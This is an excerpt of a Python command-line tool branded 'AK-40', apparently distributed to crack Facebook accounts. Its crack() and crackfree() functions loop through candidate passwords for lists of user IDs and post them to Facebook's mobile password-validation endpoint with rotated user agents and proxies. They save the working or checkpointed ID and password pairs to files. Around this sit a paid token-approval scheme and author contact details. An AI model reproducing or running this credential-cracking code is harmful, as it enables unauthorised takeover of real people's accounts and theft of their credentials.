...
time.sleep(2)
#os.system('clear')
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mUPDATE VERSHON 8.3V...! ')
#os.system("espeak -a 300 \"UPDATE VERSION 8.3V,\"")
time.sleep(2)
#os.system('clear')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/AK-40/AK-On-Fire/blob/main/prox.txt').text
...
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/Ajmir.Hossain.008?mibextid=b06tZ0')
logo =(f"""
\033[38;5;196m──────────────────────────────────────────────────
...
\033[38;5;196m───────────────────────────────────────────────────
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;92m AK\033[1;91m-\033[1;92mAjmir Hossain\033[1;91m-\033[1;92mKING\033[1;91m-\033[1;92mBRO            \033[1;91m|
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;92mAK\033[1;91m-\033[1;92mAK-40                   \033[1;91m|
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m TOOL STATUS\033[1;91m  : \033[1;92m FILE CLONE                   \033[1;91m|
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m WHATSAPP\033[1;91m\033[1;91m     :  \033[1;92m01813225678\033[1;91m\033[1;92m                  \033[1;91m|
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m TOOL VIRSION\033[1;91m :  \033[1;35m[\033[1;32m\033[1;92m8.3\033[1;35m]                        \033[1;91m|
\033[38;5;196m──────────────────────────────────────────────────""")
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/AK-40/AK-On-Fire/blob/main/Approval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      os.system("python AK-40.py")
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801813225678?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
os.system('espeak -a 300 " Welcome,   to,  AK-4p,  V I P,  Tools"')
def back():
	login()
...
def menu():
    ...
    print(f'\033[1;91m┗━───────────────────────────\033[1;37m')
    AK = input('\x1b\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE: ')
    if AK in ['111']:
        login()
        dump_massal()
    elif AK in ['1']:
        ...
        os.system('xdg-open https://github.com/AK-40')
        os.system("python nono.py")
    elif AK in ['3','03']:
        result()
    elif AK in ['0']:
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook/Ajmir.Hossain.008")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[AK-40-OK]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " AK-40,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[AK-40]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mAK-Cp🖤\033[1;91m] {idf} • {pw}')
                print(f'\033[38;5;196m───────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
